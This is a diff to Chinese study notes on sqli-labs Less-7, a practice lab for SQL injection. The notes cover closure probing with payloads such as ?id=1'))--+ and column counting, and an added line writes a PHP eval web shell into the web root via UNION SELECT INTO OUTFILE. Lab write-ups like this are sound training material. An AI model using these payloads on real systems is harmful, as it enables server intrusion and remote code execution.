@@ -1,11 +1,19 @@
 # Less-7 导出文件GET字符型注入
+
+## 文件读写注入条件
+在配置文件中设置
+secure_file_priv=''
+
+**注：Windows的配置文件在mysql下的my.ini**
+Linux的配置文件在/etc/conf
   新题型，如果可以写入文件，那么我们最简单的是上传一句话马 直接连，就可以获取一个低权限的账户，所以如果在注入中存在此类问题，那也是比较危险的漏洞
+  
 ?id=1' 报错
 ?id=1'--+ 报错
 ?id=1" 正常
 ?id=1')--+ 报错
 **?id=1'))--+ 正常回显，判断'))闭合**
-![](assets/Less7/file-20260530161647106.png)
+![](assets/Less-7/file-20260530180144303.png)
 
 - 判断列数
 ?id=1')) order by 3--+ 列数为3
@@ -29,6 +37,7 @@
 	2. 注入文件
 	这里要求猜一下他的绝对路径
 	```payload
-	
+	?id=1')) UNION SELECT 1,2,'<?php eval($_POST["c"]);?>' INTO OUTFILE 'D:/phpstudy_pro/WWW/sqli-labs/Less-7/shell.php' --+
 	```
 
+![](assets/Less-7/file-20260530180144254.png)
